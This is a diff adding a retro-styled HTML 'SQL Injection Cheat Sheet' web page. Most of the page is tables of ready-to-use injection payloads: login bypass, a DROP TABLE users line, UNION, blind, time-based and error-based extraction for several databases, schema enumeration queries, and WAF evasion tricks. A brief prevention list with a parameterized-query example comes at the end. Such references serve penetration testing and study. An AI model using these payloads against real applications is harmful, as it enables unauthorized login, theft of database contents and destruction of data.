@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SQL Injection Cheat Sheet</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: lime;
+            font-family: "Comic Sans MS", cursive;
+            text-align: center;
+            margin: 0;
+            padding: 10px;
+        }
+        
+        .wrapper {
+            max-width: 800px;
+            margin: 0 auto;
+            border: 5px ridge silver;
+            background-color: navy;
+            padding: 10px;
+        }
+        
+        h1 {
+            color: yellow;
+            text-shadow: 3px 3px red;
+            font-size: 36px;
+        }
+        
+        h2 {
+            color: #FF00FF;
+            background-color: black;
+            border: 2px dashed cyan;
+            padding: 5px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            background-color: black;
+        }
+        
+        th {
+            background-color: #800080;
+            color: white;
+            border: 3px outset silver;
+            padding: 5px;
+        }
+        
+        td {
+            border: 2px inset #808080;
+            padding: 5px;
+            color: #00FFFF;
+            text-align: left;
+        }
+        
+        .section {
+            border: 2px groove #FF00FF;
+            margin: 15px 0;
+            padding: 10px;
+            background-color: #000080;
+        }
+        
+        .blink {
+            animation: blinker 1s step-end infinite;
+        }
+        
+        @keyframes blinker {
+            50% { opacity: 0; }
+        }
+        
+        .counter {
+            background-color: black;
+            color: red;
+            border: 2px inset white;
+            padding: 5px;
+            width: 150px;
+            margin: 10px auto;
+            font-family: "Courier New", monospace;
+        }
+        
+        pre {
+            background-color: black;
+            border: 1px solid #00FF00;
+            padding: 8px;
+            color: #00FF00;
+            text-align: left;
+            font-family: "Courier New", monospace;
+            overflow-x: auto;
+        }
+        
+        ul {
+            text-align: left;
+            color: white;
+        }
+        
+        .warning {
+            background-color: #FF0000;
+            color: white;
+            padding: 5px;
+            font-weight: bold;
+            border: 3px ridge yellow;
+            margin: 10px 0;
+        }
+        
+        marquee {
+            background-color: #FF0000;
+            color: white;
+            padding: 5px;
+            margin: 10px 0;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #808080;
+        }
+        
+        a {
+            color: #FF00FF;
+            text-decoration: underline;
+            font-weight: bold;
+        }
+        
+        a:hover {
+            color: #00FFFF;
+            background-color: #FF0000;
+        }
+    </style>
+</head>
+<body>
+    <marquee scrollamount="5" direction="left" behavior="alternate">
+        <span style="color:yellow">*** </span>
+        <span style="color:red">SUPER ELITE SQL INJECTION CHEAT SHEET</span>
+        <span style="color:yellow"> ***</span>
+    </marquee>
+    
+    <div class="wrapper">
+        <h1>SQL INJECTION CHEAT SHEET</h1>
+        <img src="data:image/gif;base64,R0lGODlhHgAeAJEAAAAAAP///4CAgP///yH5BAEAAAIALAAAAAB4AB4AAAJVlI+py+0fDhPzSVcvzXl33XVcCJLmiZ7qyrbug8byLLN0bd96zvd+D8wJhseEcVi8BJvMptMZfUqnParVmM0auN6w+DsOi8VkGrmsXo/TbLZ7zbaFAAA7" alt="Hacker icon">
+        
+        <div class="warning blink">
+            WARNING: FOR EDUCATIONAL PURPOSES ONLY!
+        </div>
+        
+        <div class="counter">VISITORS: 31337</div>
+        
+        <div class="section">
+            <h2>BASIC SQL INJECTION</h2>
+            <table>
+                <tr>
+                    <th>Purpose</th>
+                    <th>SQL Injection Payload</th>
+                </tr>
+                <tr>
+                    <td>Check for vulnerability</td>
+                    <td>' OR '1'='1</td>
+                </tr>
+                <tr>
+                    <td>Always true condition</td>
+                    <td>' OR 1=1 --</td>
+                </tr>
+                <tr>
+                    <td>Authentication bypass</td>
+                    <td>admin' --</td>
+                </tr>
+                <tr>
+                    <td>Terminate query</td>
+                    <td>'; DROP TABLE users; --</td>
+                </tr>
+                <tr>
+                    <td>Comment syntax (MySQL)</td>
+                    <td>-- comment<br>#comment<br>/*comment*/</td>
+                </tr>
+                <tr>
+                    <td>Comment syntax (SQL Server)</td>
+                    <td>-- comment<br>/*comment*/</td>
+                </tr>
+            </table>
+        </div>
+        
+        <div class="section">
+            <h2>UNION ATTACKS</h2>
+            <p>Determine number of columns:</p>
+            <pre>' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3-- (continue until error)</pre>
+            
+            <p>Get data with UNION:</p>
+            <table>
+                <tr>
+                    <th>Database</th>
+                    <th>UNION Attack Example</th>
+                </tr>
+                <tr>
+                    <td>MySQL</td>
+                    <td>' UNION SELECT 1,2,@@version,user(),database() --</td>
+                </tr>
+                <tr>
+                    <td>SQL Server</td>
+                    <td>' UNION SELECT 1,2,@@version,system_user,db_name() --</td>
+                </tr>
+                <tr>
+                    <td>Oracle</td>
+                    <td>' UNION SELECT 1,2,banner,user,NULL FROM v$version --</td>
+                </tr>
+                <tr>
+                    <td>PostgreSQL</td>
+                    <td>' UNION SELECT 1,2,version(),user,current_database() --</td>
+                </tr>
+            </table>
+        </div>
+        
+        <div class="section">
+            <h2>DATABASE FINGERPRINTING</h2>
+            <table>
+                <tr>
+                    <th>Database</th>
+                    <th>Query to Identify</th>
+                </tr>
+                <tr>
+                    <td>MySQL</td>
+                    <td>SELECT @@version</td>
+                </tr>
+                <tr>
+                    <td>SQL Server</td>
+                    <td>SELECT @@version</td>
+                </tr>
+                <tr>
+                    <td>Oracle</td>
+                    <td>SELECT banner FROM v$version</td>
+                </tr>
+                <tr>
+                    <td>PostgreSQL</td>
+                    <td>SELECT version()</td>
+                </tr>
+                <tr>
+                    <td>SQLite</td>
+                    <td>SELECT sqlite_version()</td>
+                </tr>
+            </table>
+        </div>
+        
+        <div class="section">
+            <h2>EXTRACTING DATABASE INFO</h2>
+            <table>
+                <tr>
+                    <th>Information</th>
+                    <th>MySQL</th>
+                    <th>SQL Server</th>
+                </tr>
+                <tr>
+                    <td>Current User</td>
+                    <td>SELECT user()<br>SELECT current_user()</td>
+                    <td>SELECT user_name()<br>SELECT system_user</td>
+                </tr>
+                <tr>
+                    <td>List Databases</td>
+                    <td>SELECT schema_name FROM information_schema.schemata</td>
+                    <td>SELECT name FROM master..sysdatabases</td>
+                </tr>
+                <tr>
+                    <td>List Tables</td>
+                    <td>SELECT table_name FROM information_schema.tables WHERE table_schema='database_name'</td>
+                    <td>SELECT name FROM database_name..sysobjects WHERE xtype='U'</td>
+                </tr>
+                <tr>
+                    <td>List Columns</td>
+                    <td>SELECT column_name FROM information_schema.columns WHERE table_name='table_name'</td>
+                    <td>SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='table_name')</td>
+                </tr>
+            </table>
+        </div>
+        
+        <div class="section">
+            <h2 class="blink">BLIND SQL INJECTION</h2>
+            <p>Boolean-based:</p>
+            <pre>' AND (SELECT 'x' FROM users WHERE username='admin' AND LENGTH(password)>5)='x'--</pre>
+            
+            <p>Time-based:</p>
+            <table>
+                <tr>
+                    <th>Database</th>
+                    <th>Time Delay Payload</th>
+                </tr>
+                <tr>
+                    <td>MySQL</td>
+                    <td>' AND (SELECT SLEEP(5))--<br>' AND IF(1=1, SLEEP(5), 0)--</td>
+                </tr>
+                <tr>
+                    <td>SQL Server</td>
+                    <td>' WAITFOR DELAY '0:0:5'--</td>
+                </tr>
+                <tr>
+                    <td>PostgreSQL</td>
+                    <td>' SELECT pg_sleep(5)--</td>
+                </tr>
+                <tr>
+                    <td>Oracle</td>
+                    <td>' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('RND',5) FROM DUAL) IS NOT NULL--</td>
+                </tr>
+            </table>
+        </div>
+        
+        <div class="section">
+            <h2>ERROR-BASED EXTRACTION</h2>
+            <table>
+                <tr>
+                    <th>Database</th>
+                    <th>Error-based Payload</th>
+                </tr>
+                <tr>
+                    <td>MySQL</td>
+                    <td>AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--</td>
+                </tr>
+                <tr>
+                    <td>SQL Server</td>
+                    <td>AND 1=CONVERT(int,(SELECT @@version))</td>
+                </tr>
+                <tr>
+                    <td>PostgreSQL</td>
+                    <td>AND 1=cast((SELECT version()) as int)</td>
+                </tr>
+                <tr>
+                    <td>Oracle</td>
+                    <td>AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))</td>
+                </tr>
+            </table>
+        </div>
+        
+        <div class="section">
+            <h2>WAF BYPASS TECHNIQUES</h2>
+            <table>
+                <tr>
+                    <th>Technique</th>
+                    <th>Example</th>
+                </tr>
+                <tr>
+                    <td>Case Variation</td>
+                    <td>SeLeCt, UniON, sElEcT</td>
+                </tr>
+                <tr>
+                    <td>URL Encoding</td>
+                    <td>%53%45%4C%45%43%54 (SELECT)</td>
+                </tr>
+                <tr>
+                    <td>Alternate Whitespace</td>
+                    <td>/**/, %09, %0A, %0D</td>
+                </tr>
+                <tr>
+                    <td>String Concatenation</td>
+                    <td>'SEL'||'ECT', CONCAT('SE','LECT')</td>
+                </tr>
+                <tr>
+                    <td>Commenting</td>
+                    <td>SEL/*comment*/ECT</td>
+                </tr>
+                <tr>
+                    <td>Equivalence</td>
+                    <td>AND 1=1 → AND '1'='1', AND 3-2=1</td>
+                </tr>
+            </table>
+        </div>
+        
+        <div class="section">
+            <h2>PREVENTION METHODS</h2>
+            <ul>
+                <li>Use parameterized queries / prepared statements</li>
+                <li>Use ORM frameworks correctly</li>
+                <li>Input validation (whitelist, not blacklist)</li>
+                <li>Escaping special characters</li>
+                <li>Least privilege database accounts</li>
+                <li>Web Application Firewalls (WAFs)</li>
+                <li>Regular security testing</li>
+                <li>Keep database software updated</li>
+            </ul>
+            
+            <pre>// Example of parameterized query
+// PHP PDO
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$username]);</pre>
+        </div>
+    </div>
+    
+    <marquee scrollamount="3" direction="right">
+        <span style="color:white">*** </span>
+        <span style="color:yellow">USE THIS POWER RESPONSIBLY</span>
+        <span style="color:white"> ***</span>
+    </marquee>
+    
+    <div class="footer">
+        <img src="data:image/gif;base64,R0lGODlhEAAQAJEDAMzMzAAAAP///wAAACH5BAEAAAMALAAAAAAQABAAAAImnI+py30Ao5ww2ovzBWD7jX3ZFyLUZaKoAZbq6ikPyx5wd9f1RSUAOw==" alt="Under Construction">
+        <span>2025 - irhdab</span>
+        <img src="data:image/gif;base64,R0lGODlhEAAQAJEDAMzMzAAAAP///wAAACH5BAEAAAMALAAAAAAQABAAAAImnI+py30Ao5ww2ovzBWD7jX3ZFyLUZaKoAZbq6ikPyx5wd9f1RSUAOw==" alt="Under Construction">
+    </div>
+</body>
+</html>
